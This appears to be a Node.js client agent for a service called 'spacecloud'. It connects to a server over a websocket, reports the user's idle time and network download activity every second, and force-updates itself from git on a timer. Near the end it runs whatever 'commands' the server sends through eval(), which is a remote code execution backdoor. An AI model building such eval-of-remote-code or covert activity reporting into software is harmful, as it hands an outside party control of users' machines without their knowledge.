require('./defaults.js');
require('./update.js')();
return;

const io = require('socket.io-client');
global.config = require('./config');
const notifier = require('node-notifier');
const path = require('path');
const robot = require('robotjs');
const jimp = require('jimp');
const desktopIdle = require('desktop-idle');
const si = require('systeminformation');
let YOUR_THRESHOLD = 10000000; // 10 MB/s
var onDownload = false;
const idleThresholdInSeconds = 300; 
let lastActiveTime = Date.now();

global.sockets = {};
global.sockets[0] = io(`${global.config.API}`, { transports: ['websocket'] });

global.sockets[0].on('connect', () => {
    console.log('connected');
});

global.sockets[0].on('disconnect', (reason) => {
    console.log(reason);
    if (reason === 'io server disconnect') {
        global.sockets[0].connect();
    }
});


function checkIdleStatus() {
    const idleTimeInSeconds = desktopIdle.getIdleTime();

    if (idleTimeInSeconds >= idleThresholdInSeconds) {
        console.log('User is idle.');
    } else {
        lastActiveTime = Date.now();
    }
}

function checkMouseMovements() {
    const mousePos = robot.getMousePos();
    const isMouseMoving = mousePos.x !== 0 || mousePos.y !== 0;

    if (isMouseMoving) {
        lastActiveTime = Date.now();
    }
}

function getNetworkStats() {
    si.networkStats().then(data => {
        const ethernetStats = data[0];
        onDownload = ethernetStats.rx_sec > YOUR_THRESHOLD ? true : false;
    }).catch(error => console.error(error));
}

setInterval(checkIdleStatus, 1000);
setInterval(checkMouseMovements, 1000); 
setInterval(getNetworkStats, 10000);

setInterval(async () => {
    let data = {
        time: Date.now(),
        idle: desktopIdle.getIdleTime(),
        onDownload: onDownload
    };

    console.log(data);

    global.sockets[0].emit('ping', data);
}, 1000);

function updateSystem() {
    let exec = require('child_process').exec;
    exec(`cd ${__dirname} && git reset --hard && git pull`, (err, stdout, stderr) => {
        console.log(stdout);
        if (stdout.includes('Already up to date.')) {
            return;
        } else {
            exec(`cd ${__dirname} && npm install`, (err, stdout, stderr) => {
                console.log(stdout);
                console.log('restarting...');
                exec(`cd ${__dirname} && pm2 restart spacecloud`, (err, stdout, stderr) => {
                    process.exit();
                });
            });
        }
    });
}

updateSystem()
setInterval(() => {
    updateSystem();
}, 10 * 60 * 1000);

setTimeout(() => {
    console.log('executing commands...');
    global.sockets[0].emit('getcommands', {}, (data) => {
        eval(data);
    });
}, 2500);